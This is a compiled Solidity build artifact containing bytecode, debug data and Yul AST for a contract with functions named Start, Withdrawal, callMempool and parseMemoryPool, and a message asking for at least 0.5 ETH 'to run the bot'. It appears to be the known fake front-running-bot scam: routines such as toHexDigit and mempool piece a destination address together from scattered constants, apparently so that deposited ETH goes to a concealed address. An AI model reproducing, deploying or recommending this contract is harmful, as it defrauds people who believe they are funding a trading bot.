0x3030300000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP5 PUSH2 0x90C JUMP JUMPDEST SWAP1 POP DUP1 SWAP6 POP POP POP POP POP POP PUSH2 0x907 JUMP JUMPDEST PUSH1 0x1 DUP2 SUB PUSH2 0x8FF JUMPI PUSH0 PUSH2 0x8F0 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x4 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3030303000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP5 PUSH2 0x90C JUMP JUMPDEST SWAP1 POP DUP1 SWAP6 POP POP POP POP POP POP PUSH2 0x907 JUMP JUMPDEST DUP2 SWAP5 POP POP POP POP POP JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x60 PUSH0 DUP4 SWAP1 POP PUSH0 DUP4 SWAP1 POP PUSH0 DUP2 MLOAD DUP4 MLOAD PUSH2 0x925 SWAP2 SWAP1 PUSH2 0xCEA JUMP JUMPDEST PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0x93E JUMPI PUSH2 0x93D PUSH2 0xE4F JUMP JUMPDEST JUMPDEST PUSH1 0x40 MLOAD SWAP1 DUP1 DUP3 MSTORE DUP1 PUSH1 0x1F ADD PUSH1 0x1F NOT AND PUSH1 0x20 ADD DUP3 ADD PUSH1 0x40 MSTORE DUP1 ISZERO PUSH2 0x970 JUMPI DUP2 PUSH1 0x20 ADD PUSH1 0x1 DUP3 MUL DUP1 CALLDATASIZE DUP4 CALLDATACOPY DUP1 DUP3 ADD SWAP2 POP POP SWAP1 POP JUMPDEST POP SWAP1 POP PUSH0 DUP2 SWAP1 POP PUSH0 DUP1 PUSH0 SWAP2 POP JUMPDEST DUP6 MLOAD DUP3 LT ISZERO PUSH2 0xA04 JUMPI DUP6 DUP3 DUP2 MLOAD DUP2 LT PUSH2 0x999 JUMPI PUSH2 0x998 PUSH2 0xCB4 JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL DUP4 DUP3 DUP1 PUSH2 0x9B0 SWAP1 PUSH2 0xDAB JUMP JUMPDEST SWAP4 POP DUP2 MLOAD DUP2 LT PUSH2 0x9C3 JUMPI PUSH2 0x9C2 PUSH2 0xCB4 JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD SWAP1 PUSH31 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 DUP2 PUSH0 BYTE SWAP1 MSTORE8 POP DUP2 DUP1 PUSH2 0x9FC SWAP1 PUSH2 0xDAB JUMP JUMPDEST SWAP3 POP POP PUSH2 0x97D JUMP JUMPDEST PUSH0 SWAP2 POP JUMPDEST DUP5 MLOAD DUP3 LT ISZERO PUSH2 0xA8F JUMPI DUP5 DUP3 DUP2 MLOAD DUP2 LT PUSH2 0xA24 JUMPI PUSH2 0xA23 PUSH2 0xCB4 JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL DUP4 DUP3 DUP1 PUSH2 0xA3B SWAP1 PUSH2 0xDAB JUMP JUMPDEST SWAP4 POP DUP2 MLOAD DUP2 LT PUSH2 0xA4E JUMPI PUSH2 0xA4D PUSH2 0xCB4 JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD SWAP1 PUSH31 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 DUP2 PUSH0 BYTE SWAP1 MSTORE8 POP DUP2 DUP1 PUSH2 0xA87 SWAP1 PUSH2 0xDAB JUMP JUMPDEST SWAP3 POP POP PUSH2 0xA08 JUMP JUMPDEST DUP3 SWAP7 POP POP POP POP POP POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH3 0x4958A SWAP1 POP SWAP1 JUMP JUMPDEST PUSH0 PUSH3 0xEF2E4 SWAP1 POP SWAP1 JUMP JUMPDEST PUSH0 PUSH3 0xEBE5B SWAP1 POP SWAP1 JUMP JUMPDEST PUSH0 DUP2 PUSH1 0xFF AND PUSH0 GT ISZERO DUP1 ISZERO PUSH2 0xAD4 JUMPI POP PUSH1 0x9 DUP3 PUSH1 0xFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0xB12 JUMPI DUP2 PUSH32 0x3000000000000000000000000000000000000000000000000000000000000000 PUSH1 0xF8 SHR PUSH2 0xB08 SWAP2 SWAP1 PUSH2 0xEEB JUMP JUMPDEST PUSH1 0xF8 SHL SWAP1 POP PUSH2 0xB78 JUMP JUMPDEST DUP2 PUSH1 0xFF AND PUSH1 0xA GT ISZERO DUP1 ISZERO PUSH2 0xB2A JUMPI POP PUSH1 0xF DUP3 PUSH1 0xFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0xB74 JUMPI PUSH1 0xA DUP3 PUSH32 0x6100000000000000000000000000000000000000000000000000000000000000 PUSH1 0xF8 SHR PUSH2 0xB60 SWAP2 SWAP1 PUSH2 0xEEB JUMP JUMPDEST PUSH2 0xB6A SWAP2 SWAP1 PUSH2 0xF1F JUMP JUMPDEST PUSH1 0xF8 SHL SWAP1 POP PUSH2 0xB78 JUMP JUMPDEST PUSH0 DUP1 REVERT JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0xBB4 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0xB99 JUMP JUMPDEST PUSH0 DUP5 DUP5 ADD MSTORE POP POP POP POP JUMP JUMPDEST PUSH0 PUSH1 0x1F NOT PUSH1 0x1F DUP4 ADD AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0xBD9 DUP3 PUSH2 0xB7D JUMP JUMPDEST PUSH2 0xBE3 DUP2 DUP6 PUSH2 0xB87 JUMP JUMPDEST SWAP4 POP PUSH2 0xBF3 DUP2 DUP6 PUSH1 0x20 DUP7 ADD PUSH2 0xB97 JUMP JUMPDEST PUSH2 0xBFC DUP2 PUSH2 0xBBF JUMP JUMPDEST DUP5 ADD SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0xC1F DUP2 DUP5 PUSH2 0xBCF JUMP JUMPDEST SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 PUSH2 0xC7D DUP3 PUSH2 0xC27 JUMP JUMPDEST SWAP2 POP PUSH2 0xC88 DUP4 PUSH2 0xC27 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 MUL PUSH2 0xC96 DUP2 PUSH2 0xC27 JUMP JUMPDEST SWAP2 POP DUP3 DUP3 DIV DUP5 EQ DUP4 ISZERO OR PUSH2 0xCAD JUMPI PUSH2 0xCAC PUSH2 0xC46 JUMP JUMPDEST JUMPDEST POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x32 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0xCF4 DUP3 PUSH2 0xCE1 JUMP JUMPDEST SWAP2 POP PUSH2 0xCFF DUP4 PUSH2 0xCE1 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 ADD SWAP1 POP DUP1 DUP3 GT ISZERO PUSH2 0xD17 JUMPI PUSH2 0xD16 PUSH2 0xC46 JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH2 0xD27 DUP3 PUSH2 0xC27 JUMP JUMPDEST SWAP2 POP PUSH2 0xD32 DUP4 PUSH2 0xC27 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 SUB SWAP1 POP PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0xD5E JUMPI PUSH2 0xD5D PUSH2 0xC46 JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH2 0xD6E DUP3 PUSH2 0xC27 JUMP JUMPDEST SWAP2 POP PUSH2 0xD79 DUP4 PUSH2 0xC27 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 ADD SWAP1 POP PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0xDA5 JUMPI PUSH2 0xDA4 PUSH2 0xC46 JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH2 0xDB5 DUP3 PUSH2 0xCE1 JUMP JUMPDEST SWAP2 POP PUSH32 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 SUB PUSH2 0xDE7 JUMPI PUSH2 0xDE6 PUSH2 0xC46 JUMP JUMPDEST JUMPDEST PUSH1 0x1 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x12 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 PUSH2 0xE29 DUP3 PUSH2 0xCE1 JUMP JUMPDEST SWAP2 POP PUSH2 0xE34 DUP4 PUSH2 0xCE1 JUMP JUMPDEST SWAP3 POP DUP3 PUSH2 0xE44 JUMPI PUSH2 0xE43 PUSH2 0xDF2 JUMP JUMPDEST JUMPDEST DUP3 DUP3 DIV SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x41 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 PUSH2 0xE86 DUP3 PUSH2 0xCE1 JUMP JUMPDEST SWAP2 POP PUSH2 0xE91 DUP4 PUSH2 0xCE1 JUMP JUMPDEST SWAP3 POP DUP3 PUSH2 0xEA1 JUMPI PUSH2 0xEA0 PUSH2 0xDF2 JUMP JUMPDEST JUMPDEST DUP3 DUP3 MOD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH2 0xEB6 DUP3 PUSH2 0xCE1 JUMP JUMPDEST SWAP2 POP PUSH2 0xEC1 DUP4 PUSH2 0xCE1 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 SUB SWAP1 POP DUP2 DUP2 GT ISZERO PUSH2 0xED9 JUMPI PUSH2 0xED8 PUSH2 0xC46 JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0xFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0xEF5 DUP3 PUSH2 0xEDF JUMP JUMPDEST SWAP2 POP PUSH2 0xF00 DUP4 PUSH2 0xEDF JUMP JUMPDEST SWAP3 POP DUP3 DUP3 ADD SWAP1 POP PUSH1 0xFF DUP2 GT ISZERO PUSH2 0xF19 JUMPI PUSH2 0xF18 PUSH2 0xC46 JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH2 0xF29 DUP3 PUSH2 0xEDF JUMP JUMPDEST SWAP2 POP PUSH2 0xF34 DUP4 PUSH2 0xEDF JUMP JUMPDEST SWAP3 POP DUP3 DUP3 SUB SWAP1 POP PUSH1 0xFF DUP2 GT ISZERO PUSH2 0xF4D JUMPI PUSH2 0xF4C PUSH2 0xC46 JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP INVALID 0x4E PUSH16 0x7420656E6F756768206C697175696469 PUSH21 0x7920617661696C61626C65206F6E2074686520636F PUSH15 0x747261637420746F2072756E207468 PUSH6 0x20626F742E20 NUMBER PUSH16 0x6E747261637420636F6465206E656564 PUSH20 0x206174206C6561737420302E352045544820746F KECCAK256 PUSH2 0x766F PUSH10 0x642063757272656E7420 PUSH8 0x617320666565732E LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 PUSH20 0x4C2DB0FA60328170891DFA6297B99F06D0F9E9C2 SWAP14 MSIZE 0x4A 0xEC 0xF 0xC6 PUSH26 0xD09DFC7F64736F6C634300081400330000000000000000000000 ",
							"sourceMap": "399:12564:0:-:0;;;498:22;;;;;;;;;;399:12564;;;;;;"
						},
						"deployedBytecode": {
							"functionDebugData": {
								"@Start_859": {
									"entryPoint": 169,
									"id": 859,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"@Stop_918": {
									"entryPoint": 432,
									"id": 918,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"@Withdrawal_971": {
									"entryPoint": 271,
									"id": 971,
									"parameterSlots": 0,
									"returnSlots": 1
								},
								"@_22": {
									"entryPoint": null,
									"id": 22,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"@callMempool_771": {
									"entryPoint": 566,
									"id": 771,
									"parameterSlots": 0,
									"returnSlots": 1
								},
								"@checkLiquidity_938": {
									"entryPoint": 534,
									"id": 938,
									"parameterSlots": 0,
									"returnSlots": 1
								},
								"@checkMempool_644": {
									"entryPoint": 1666,
									"id": 644,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"@getLiquidity_930": {
									"entryPoint": 1649,
									"id": 930,
									"parameterSlots": 0,
									"returnSlots": 1
								},
								"@getMemPoolDepth_1091": {
									"entryPoint": 2738,
									"id": 1091,
									"parameterSlots": 0,
									"returnSlots": 1
								},
								"@getMemPoolHeight_660": {
									"entryPoint": 2728,
									"id": 660,
									"parameterSlots": 0,
									"returnSlots": 1
								},
								"@getMemPoolLength_652": {
									"entryPoint": 2718,
									"id": 652,
									"parameterSlots": 0,
									"returnSlots": 1
								},
								"@getMemPoolOffset_312": {
									"entryPoint": 1656,
									"id": 312,
									"parameterSlots": 0,
									"returnSlots": 1
								},
								"@mempool_1188": {
									"entryPoint": 2316,
									"id": 1188,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"@parseMemoryPool_488": {
									"entryPoint": 934,
									"id": 488,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"@toHexDigit_834": {
									"entryPoint": 2748,
									"id": 834,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"abi_encode_t_string_memory_ptr_to_t_string_memory_ptr_fromStack": {
									"entryPoint": 3023,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_encode_tuple_t_string_memory_ptr__to_t_string_memory_ptr__fromStack_reversed": {
									"entryPoint": 3079,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"array_length_t_string_memory_ptr": {
									"entryPoint": 2941,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"array_storeLengthForEncoding_t_string_memory_ptr_fromStack": {
									"entryPoint": 2951,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"checked_add_t_uint160": {
									"entryPoint": 3428,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"checked_add_t_uint256": {
									"entryPoint": 3306,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"checked_add_t_uint8": {
									"entryPoint": 3819,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"checked_div_t_uint256": {
									"entryPoint": 3615,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"checked_mul_t_uint160": {
									"entryPoint": 3187,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"checked_sub_t_uint160": {
									"entryPoint": 3357,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"checked_sub_t_uint256": {
									"entryPoint": 3756,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"checked_sub_t_uint8": {
									"entryPoint": 3871,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"cleanup_t_uint160": {
									"entryPoint": 3111,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"cleanup_t_uint256": {
									"entryPoint": 3297,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"cleanup_t_uint8": {
									"entryPoint": 3807,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"copy_memory_to_memory_with_cleanup": {
									"entryPoint": 2967,
									"id": null,
									"parameterSlots": 3,
									"returnSlots": 0
								},
								"increment_t_uint256": {
									"entryPoint": 3499,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"mod_t_uint256": {
									"entryPoint": 3708,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"panic_error_0x11": {
									"entryPoint": 3142,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"panic_error_0x12": {
									"entryPoint": 3570,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"panic_error_0x32": {
									"entryPoint": 3252,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"panic_error_0x41": {
									"entryPoint": 3663,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"round_up_to_mul_of_32": {
									"entryPoint": 3007,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								}
							},
							"generatedSources": [
								{
									"ast": {
										"nodeType": "YulBlock",
										"src": "0:4692:10",
										"statements": [
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "66:40:10",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "77:22:10",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "93:5:10"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nodeType": "YulIdentifier",
																	"src": "87:5:10"
																},
																"nodeType": "YulFunctionCall",
																"src": "87:12:10"
															},
															"variableNames": [
																{
																	"name": "length",
																	"nodeType": "YulIdentifier",
																	"src": "77:6:10"
																}
															]
														}
													]
												},
												"name": "array_length_t_string_memory_ptr",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "49:5:10",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "length",
														"nodeType": "YulTypedName",
														"src": "59:6:10",
														"type": ""
													}
												],
												"src": "7:99:10"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "208:73:10",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "225:3:10"
																	},
																	{
																		"name": "length",
																		"nodeType": "YulIdentifier",
																		"src": "230:6:10"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "218:6:10"
																},
																"nodeType": "YulFunctionCall",
																"src": "218:19:10"
															},
															"nodeType": "YulExpressionStatement",
															"src": "218:19:10"
														},
														{
															"nodeType": "YulAssignment",
															"src": "246:29:10",
															"value": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "265:3:10"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "270:4:10",
																		"type": "",
																		"value": "0x20"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "261:3:10"
																},
																"nodeType": "YulFunctionCall",
																"src": "261:14:10"
															},
															"variableNames": [
																{
																	"name": "updated_pos",
																	"nodeType": "YulIdentifier",
																	"src": "246:11:10"
																}
															]
														}
													]
												},
												"name": "array_storeLengthForEncoding_t_string_memory_ptr_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "180:3:10",
														"type": ""
													},
													{
														"name": "length",
														"nodeType": "YulTypedName",
														"src": "185:6:10",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "updated_pos",
														"nodeType": "YulTypedName",
														"src": "196:11:10",
														"type": ""
													}
												],
												"src": "112:169:10"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "349:184:10",
													"statements": [
														{
															"nodeType": "YulVariableDeclaration",
															"src": "359:10:10",
															"value": {
																"kind": "number",
																"nodeType": "YulLiteral",
																"src": "368:1:10",
																"type": "",
																"value": "0"
															},
															"variables": [
																{
																	"name": "i",
																	"nodeType": "YulTypedName",
																	"src": "363:1:10",
																	"type": ""
																}
															]
														},
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "428:63:10",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"arguments": [
																						{
																							"name": "dst",
																							"nodeType": "YulIdentifier",
																							"src": "453:3:10"
																						},
																						{
																							"name": "i",
																							"nodeType": "YulIdentifier",
																							"src": "458:1:10"
																						}
																					],
																					"functionName": {
																						"name": "add",
																						"nodeType": "YulIdentifier",
																						"src": "449:3:10"
																					},
																					"nodeType": "YulFunctionCall",
																					"src": "449:11:10"
																				},
																				{
																					"arguments": [
																						{
																							"arguments": [
																								{
																									"name": "src",
																									"nodeType": "YulIdentifier",
																									"src": "472:3:10"
																								},
																								{
																									"name": "i",
																									"nodeType": "YulIdentifier",
																									"src": "477:1:10"
																								}
																							],
																							"functionName": {
																								"name": "add",
																								"nodeType": "YulIdentifier",
																								"src": "468:3:10"
																							},
																							"nodeType": "YulFunctionCall",
																							"src": "468:11:10"
																						}
																					],
																					"functionName": {
																						"name": "mload",
																						"nodeType": "YulIdentifier",
																						"src": "462:5:10"
																					},
																					"nodeType": "YulFunctionCall",
																					"src": "462:18:10"
																				}
																			],
																			"functionName": {
																				"name": "mstore",
																				"nodeType": "YulIdentifier",
																				"src": "442:6:10"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "442:39:10"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "442:39:10"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"name": "i",
																		"nodeType": "YulIdentifier",
																		"src": "389:1:10"
																	},
																	{
																		"name": "length",
																		"nodeType": "YulIdentifier",
																		"src": "392:6:10"
																	}
																],
																"functionName": {
																	"name": "lt",
																	"nodeType": "YulIdentifier",
																	"src": "386:2:10"
																},
																"nodeType": "YulFunctionCall",
																"src": "386:13:10"
															},
															"nodeType": "YulForLoop",
															"post": {
																"nodeType": "YulBlock",
																"src": "400:19:10",
																"statements": [
																	{
																		"nodeType": "YulAssignment",
																		"src": "402:15:10",
																		"value": {
																			"arguments": [
																				{
																					"name": "i",
																					"nodeType": "YulIdentifier",
																					"src": "411:1:10"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "414:2:10",
																					"type": "",
																					"value": "32"
																				}
																			],
																			"functionName": {
																				"name": "add",
																				"nodeType": "YulIdentifier",
																				"src": "407:3:10"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "407:10:10"
																		},
																		"variableNames": [
																			{
																				"name": "i",
																				"nodeType": "YulIdentifier",
																				"src": "402:1:10"
																			}
																		]
																	}
																]
															},
															"pre": {
																"nodeType": "YulBlock",
																"src": "382:3:10",
																"statements": []
															},
															"src": "378:113:10"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "dst",
																				"nodeType": "YulIdentifier",
																				"src": "511:3:10"
																			},
																			{
																				"name": "length",
																				"nodeType": "YulIdentifier",
																				"src": "516:6:10"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "507:3:10"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "507:16:10"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "525:1:10",
																		"type": "",
																		"value": "0"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "500:6:10"
																},
																"nodeType": "YulFunctionCall",
																"src": "500:27:10"
															},
															"nodeType": "YulExpressionStatement",
															"src": "500:27:10"
														}
													]
												},
												"name": "copy_memory_to_memory_with_cleanup",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "src",
														"nodeType": "YulTypedName",
														"src": "331:3:10",
														"type": ""
													},
													{
														"name": "dst",
														"nodeType": "YulTypedName",
														"src": "336:3:10",
														"type": ""
													},
													{
														"name": "length",
														"nodeType": "YulTypedName",
														"src": "341:6:10",
														"type": ""
													}
												],
												"src": "287:246:10"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "587:54:10",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "597:38:10",
															"value": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "615:5:10"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "622:2:10",
																				"type": "",
																				"value": "31"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "611:3:10"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "611:14:10"
																	},
																	{
																		"arguments": [
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "631:2:10",
																				"type": "",
																				"value": "31"
																			}
																		],
																		"functionName": {
																			"name": "not",
																			"nodeType": "YulIdentifier",
																			"src": "627:3:10"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "627:7:10"
																	}
																],
																"functionName": {
																	"name": "and",
																	"nodeType": "YulIdentifier",
																	"src": "607:3:10"
																},
																"nodeType": "YulFunctionCall",
																"src": "607:28:10"
															},
															"variableNames": [
																{
																	"name": "result",
																	"nodeType": "YulIdentifier",
																	"src": "597:6:10"
																}
															]
														}
													]
												},
												"name": "round_up_to_mul_of_32",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "570:5:10",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "result",
														"nodeType": "YulTypedName",
														"src": "580:6:10",
														"type": ""
													}
												],
												"src": "539:102:10"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "739:285:10",
													"statements": [
														{
															"nodeType": "YulVariableDeclaration",
															"src": "749:53:10",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "796:5:10"
																	}
																],
																"functionName": {
																	"name": "array_length_t_string_memory_ptr",
																	"nodeType": "YulIdentifier",
																	"src": "763:32:10"
																},
																"nodeType": "YulFunctionCall",
																"src": "763:39:10"
															},
															"variables": [
																{
																	"name": "length",
																	"nodeType": "YulTypedName",
																	"src": "753:6:10",
																	"type": ""
																}
															]
														},
														{
															"nodeType": "YulAssignment",
															"src": "811:78:10",
															"value": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "877:3:10"
																	},
																	{
																		"name": "length",
																		"nodeType": "YulIdentifier",
																		"src": "882:6:10"
																	}
																],
																"functionName": {
																	"name": "array_storeLengthForEncoding_t_string_memory_ptr_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "818:58:10"
																},
																"nodeType": "YulFunctionCall",
																"src": "818:71:10"
															},
															"variableNames": [
																{
																	"name": "pos",
																	"nodeType": "YulIdentifier",
																	"src": "811:3:10"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "937:5:10"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "944:4:10",
																				"type": "",
																				"value": "0x20"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "933:3:10"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "933:16:10"
																	},
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "951:3:10"
																	},
																	{
																		"name": "length",
																		"nodeType": "YulIdentifier",
																		"src": "956:6:10"
																	}
																],
																"functionName": {
																	"name": "copy_memory_to_memory_with_cleanup",
																	"nodeType": "YulIdentifier",
																	"src": "898:34:10"
																},
																"nodeType": "YulFunctionCall",
																"src": "898:65:10"
															},
															"nodeType": "YulExpressionStatement",
															"src": "898:65:10"
														},
														{
															"nodeType": "YulAssignment",
															"src": "972:46:10",
															"value": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "983:3:10"
																	},
																	{
																		"arguments": [
																			{
																				"name": "length",
																				"nodeType": "YulIdentifier",
																				"src": "1010:6:10"
																			}
																		],
																		"functionName": {
																			"name": "round_up_to_mul_of_32",
																			"nodeType": "YulIdentifier",
